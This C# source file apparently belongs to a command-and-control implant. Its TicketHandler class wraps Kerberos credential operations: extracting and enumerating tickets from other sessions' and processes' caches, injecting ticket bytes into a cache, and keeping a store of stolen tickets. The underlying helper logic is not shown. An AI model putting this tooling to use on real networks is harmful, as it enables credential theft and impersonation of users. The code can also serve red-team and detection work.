using System;
using System.Collections.Generic;
using System.Linq;
using PhantomInterop.Features.KerberosTickets;
using PhantomInterop.Features.WindowsTypesAndAPIs;
using PhantomInterop.Interfaces;
using PhantomInterop.Structs.MythicStructs;
using PhantomInterop.Utils;

namespace KerberosTickets;

public class TicketHandler : ITicketManager
{
    
    
    
    
    
    internal static IAgent Agent { get; private set;} = null!;
    
    internal List<KerberosTicketStoreDTO> loadedTickets = new List<KerberosTicketStoreDTO>();

    
    public TicketHandler(IAgent agent)
    {
        Agent = agent;
        WindowsAPI.Initialize();
        DebugHelp.DebugWriteLine("TicketHandler initialized");
    }


    public List<Artifact> GetArtifacts() => KerberosHelpers.GetCreatedArtifacts();
    public string GetCurrentLuid() => KerberosHelpers.GetCurrentLuid().ToString();
    
    public string GetTargetProcessLuid(int pid) => KerberosHelpers.GetTargetProcessLuid(pid).ToString();
    
    
    public (KerberosTicket?, string) ExtractTicketFromCache(string luid, string serviceName) => KerberosHelpers.ExtractTicket(WinNTTypes.LUID.FromString(luid), serviceName);
    public List<KerberosTicket> EnumerateTicketsInCache(bool getSystemTickets = false, string luid = "") => KerberosHelpers.TriageTickets(getSystemTickets,luid).ToList();
    
    public (bool, string) LoadTicketIntoCache(byte[] ticket, string luid) => KerberosHelpers.LoadTicket(ticket, WinNTTypes.LUID.FromString(luid));
    
    public (bool, string) UnloadTicketFromCache(string serviceName, string domainName, string luid, bool All = false) =>  KerberosHelpers.UnloadTicket(serviceName, domainName, WinNTTypes.LUID.FromString(luid), All);
    
    public KerberosTicket? GetTicketDetailsFromKirbi(byte[] kirbi) => KerberosHelpers.TryGetTicketDetailsFromKirbi(kirbi);
    
    
    
    public List<KerberosTicketStoreDTO> GetTicketsFromTicketStore() => loadedTickets;
    
    public void AddTicketToTicketStore(KerberosTicketStoreDTO ticket) => loadedTickets.Add(ticket);

    public bool RemoveTicketFromTicketStore(string serviceName, bool All = false) 
        => All ? loadedTickets.RemoveAll(_ => true) > 0  
            : loadedTickets.RemoveAll(x => x.ServiceFullName.Equals(serviceName, StringComparison.CurrentCultureIgnoreCase)) > 0;

}